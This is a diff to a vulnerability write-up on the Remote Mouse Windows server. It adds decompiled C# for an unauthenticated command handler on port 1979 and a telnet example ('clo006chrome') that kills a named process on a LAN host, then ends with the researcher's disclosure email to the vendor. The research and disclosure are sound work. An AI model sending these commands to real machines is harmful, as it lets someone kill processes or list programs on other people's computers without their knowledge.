@@ -825,6 +825,74 @@ I wanted to see if you could pass through and click "Ok" on a UAC pop-up. This i
 
 TODO: The App can pull the Icons from the taskbar as a quick hotbar for the user. These must be transmitted over the wire, so I'd like to see how that works and download them as part of `mousetrap.py`.
 
+I noticed in the Android App, one of the functionalities shows the icons you have on your taskbar (including the drawer). I decided to do another packet capture while making the request on my phone and saw that the App sends a TCP packet with the data `act` to the server, and the server dumps the file name, location, and PNG logo of the everything on the task bar. 
+
+Very curious to see if this is encrypted/password protected when the password is set. To check, I'll telnet to make sure the password is required (will dump `pwd pwd`), and then send the `act` to port 1979:
+
+![Logos No Password](imgs/image-nopass.png)
+
+This shows you can view anyone's taskbar with no password whatsoever, even if the password is set on the server. This makes me think that only services provided by the server on port 1978 is password "protected", if a password is set.
+
+To better understand this workflow, let's go ahead and find the logic inside the RemoteMouse binary. This actually took me about an hour of digging around, mainly because I'm not 100% familiar with dnSpy's string search functionality. Anyway, I located the `"act"` string in the `q.a(object)` function inside `RemoteMouse.exe`. We can see there's actually quite a few commands that you can send:
+
+ - `opn` - I'm guessing this opens a program
+ - `act` - This retrieves the logos and taskbar information
+ - `max` - Maximize a program's window
+ - `min` - Minimize a program's window
+ - `clo` - Close a program's window
+
+Let's look at `clo`'s logic:
+
+```C#
+
+if (!(@string == "clo"))
+{
+    continue;
+}
+goto IL_1EB;
+
+// ...snip...
+
+IL_1EB:
+    byte[] array6 = new byte[3];
+    num = socket.Receive(array6, 3, SocketFlags.None);
+    int num4 = int.Parse(Encoding.UTF8.GetString(array6));
+    byte[] array7 = new byte[num4];
+    if (num > 0)
+    {
+        num = socket.Receive(array7, num4, SocketFlags.None);
+    }
+    string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(Encoding.UTF8.GetString(array7));
+    if (!fileNameWithoutExtension.ToLower().Equals("explorer"))
+    {
+        try
+        {
+            Process[] processesByName = Process.GetProcessesByName(fileNameWithoutExtension);
+            for (int i = 0; i < processesByName.Length; i++)
+            {
+                processesByName[i].Kill();
+            }
+        }
+        catch
+        {
+        }
+        continue;
+    }
+    continue;
+```
+
+This means, by sending a message to port 1979, say something like 
+
+```bash
+elnet 192.168.86.195 1979
+Trying 192.168.86.195...
+Connected to 192.168.86.195.
+Escape character is '^]'.
+clo006chrome
+```
+
+You can force a process to die without a user every realizing. No mouse movement, no keyboard input, nothing. All of this with NO authentication.
+
 ## Disclosure
 
 On 02/06/2021 I sent an email to `info@remotemouse.net`:
@@ -846,7 +914,8 @@ On 02/06/2021 I sent an email to `info@remotemouse.net`:
 > Per standard vulnerability disclosure practices, please respond within 90 days of today (Friday May 7, 2021). If you have any questions on the details of the vulnerabilities, or you would like any assistance, please do not hesitate to reach out to me via email (me@axelp.io).
 >
 > Thank you,
-> Axel Persinger.
+>
+>  Axel Persinger.
 
 
 ### Special Thanks
